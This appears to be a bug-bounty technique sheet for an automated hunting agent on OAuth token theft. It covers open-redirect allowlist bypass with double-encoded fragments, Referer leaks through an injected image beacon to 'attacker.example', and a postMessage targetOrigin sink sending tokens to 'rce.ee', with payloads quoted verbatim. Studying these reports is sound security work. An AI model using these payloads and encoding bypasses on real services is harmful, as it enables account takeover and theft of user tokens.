---
name: hunter-l3-oauth-token-theft
description: "Use when hunting OAuth Token Theft on a target. Loads the L3 technique sheet: OAuth token theft is the class of bugs where an attacker causes a victim's OAuth access token or authorization code — which should only ever land on the client's own registered redirect or be exchange"
domain: cybersecurity
subdomain: web
tags:
- web
- oauth-token-theft
- hunting
- l3
version: '1.0'
---

# OAuth Token Theft — Technique Sheet

## Overview

OAuth token theft is the class of bugs where an attacker causes a victim's OAuth access token or authorization code — which should only ever land on the client's own registered redirect or be exchanged server-side — to be delivered to an attacker-controlled origin instead. It pays when a provider trusts a client-controlled parameter (redirect_uri allowlist too broad, targetOrigin, an open redirect inside the allowlisted domain) or when the token/code leaks via browser channels (URL fragments, Referer headers, postMessage). All three records here are one-click, no-interaction-beyond-click token exfiltration chains leading to account takeover.

## Distinct sub-patterns

### Sub-pattern 1: Overly broad redirect_uri allowlist + open redirect + double-encoded fragment delimiter

- Endpoint shape / parameter:
  `GET https://cards.twitter.com/cards/{card_owner_id}/{card_slug}` (Twitter card URL used as the redirect target inside a Microsoft/Outlook OAuth flow); the attacker-controlled part is the card slug / redirect URL.
- Payload (verbatim):
  `https://cards.twitter.com/cards/18ce53y6aap/yyms%2523`
  Note the double encoding: `%2523` decodes to `%23`, which decodes again to `#` — the URL fragment delimiter.
- Root-cause pattern:
  Microsoft OAuth accepted any redirect URI matching `http(s)://*.twitter.com/*`. Twitter itself contained an open redirect (`cards.twitter.com/cards/.../yyms` forwards to an attacker site). Because the open redirect was on an allowlisted domain, it passed the provider's redirect_uri validation. The double-encoded `%2523` was decoded late in the chain so that the redirect landed on the attacker URL *with the OAuth `access_token` appended in the URL fragment* (everything after the newly materialized `#`), which the attacker page reads via `location.hash`.
- Impact proven:
  Stole the victim's OAuth access_token after a single click from an already-authorized user (no consent prompt), by chaining the Twitter open redirect through the Microsoft Outlook OAuth flow. Full token theft = account access.
- Exemplar report IDs: 131202 (X / xAI)

### Sub-pattern 2: OAuth code/token leak via Referer header from attacker-injected external image

- Endpoint shape / parameter:
  Any page where the victim arrives with the OAuth `code` (or token) in the URL and attacker-injected HTML is rendered. In the records: support forum thread replies on `support.rockstargames.com`; the parameter is the `img src` attribute in a reply.
- Payload (verbatim):
  `<img src="https://attacker.example/track">`
- Root-cause pattern:
  The attacker injects an `<img>` tag pointing at their own domain into a forum reply. When a victim opens the reply while their browser still holds the OAuth code in the URL (the referrer page), the browser sends a `Referer` header containing that code to the attacker's tracking endpoint. The application failed to strip/rel external HTML and failed to control referrer policy on the OAuth-return page.
- Impact proven:
  Users who opened the attacker's forum reply under the right conditions had their OAuth token extracted by the attacker. Note: this is a *code* in Referer, which the attacker can then exchange — same end state as token theft.
- Exemplar report IDs: 482743 (Rockstar Games)

### Sub-pattern 3: postMessage token sink with attacker-controlled targetOrigin

- Endpoint shape / parameter:
  `GET /auth/response.html?requestID=...&baseUrl=/&targetOrigin=...` (on `my.playstation.com`), fed through the OAuth authorize endpoint as the `redirect_uri` target.
- Payload (verbatim):
  `https://my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&baseUrl=/&targetOrigin=https://rce.ee/`
- Root-cause pattern:
  `auth/response.html` took the token it received from the OAuth flow and passed it to `window.opener.postMessage(..., targetOrigin)` using the `targetOrigin` **query parameter** as the postMessage target origin. Two exploitable details:
  1. Prefixing `requestID` with `window` selects the code path that posts to `window.opener` (attacker page as opener).
  2. `targetOrigin` is attacker-supplied, so the browser enforces origin restriction against... the attacker's own origin.
- Impact proven:
  The OAuth access token was delivered to attacker origin `rce.ee` via postMessage, enabling token stealing / account takeover.
- Exemplar report IDs: 821896 (PlayStation)

## Bypass / chain notes

- Redirect_uri validation bypass by open redirect: when a provider allowlists a wildcard domain (`*.twitter.com/*`), any open redirect on that domain defeats validation. Double-encoding (`%2523`) was needed because a literal `#` would have truncated the redirect_uri at validation time — encode the fragment delimiter so it survives provider-side checks and materializes only after the redirect.
- Fragment-vs-query matters: providers append tokens at the fragment (`#access_token=...`). Landing the final redirect on attacker.com requires the `#` to appear *after* attacker.com in the URL — hence the `%2523` trick rather than `?`.
- Code-in-Referer requires the victim to click through with the code still in the URL and no `Referrer-Policy: no-referrer` on the OAuth callback page; injecting the beacon *inside the target app's own content* (forum reply) means the request originates from the trusted origin, so no CSP/frame issues apply.
- postMessage chain (PlayStation) is fully attacker-scripted: attacker page opens the OAuth authorize URL → `redirect_uri` is the app's own `response.html` with poisoned params → response.html reads the token → posts it to `window.opener` = attacker. No user interaction beyond the initial click/visit of the attacker page.
- Common thread: the attacker never needs to touch the token exchange endpoint — they position themselves at the point where the token/code transits the browser (fragment, Referer, postMessage).

## Gotchas / what NOT to do

- Don't assume strict redirect_uri validation just because exact-match is documented — test every allowlisted wildcard domain for open redirects (static asset hosts, card/link-preview hosts, support portals are prime candidates).
- A single-encoded `%23` will likely be normalized/decoded by the provider before validation and fail; the records show double-encoding (`%2523`) is what survives.
- Don't test the Referer-leak pattern against arbitrary users without a controlled second account — you need to both inject the beacon and open the reply as a "victim" to prove the leak end-to-end.
- The postMessage pattern requires the exact parameter semantics (`requestID` starting with `window`); `targetOrigin` alone in a non-opener code path may go nowhere. Enumerate the response page's parameters and JS branches before assuming it's exploitable.
- These are one-click attacks on *already-authorized* flows — consent-prompt bypass is part of the impact; make sure your report demonstrates the no-prompt path.

## Real-world impact examples

- X / xAI (131202): Attacker-crafted `cards.twitter.com` URL fed into Microsoft Outlook OAuth stole the victim's `access_token` from `location.hash` after one click from an already-authorized user — no consent screen involved.
- Rockstar Games (482743): A forum reply containing `<img src="https://attacker.example/track">` caused victims' OAuth authorization codes to be transmitted in the Referer header to the attacker's server.
- PlayStation (821856/821896): A single crafted `/auth/response.html` URL with `targetOrigin=https://rce.ee/` delivered the PlayStation OAuth access token via `postMessage` to the attacker's origin — direct account takeover path.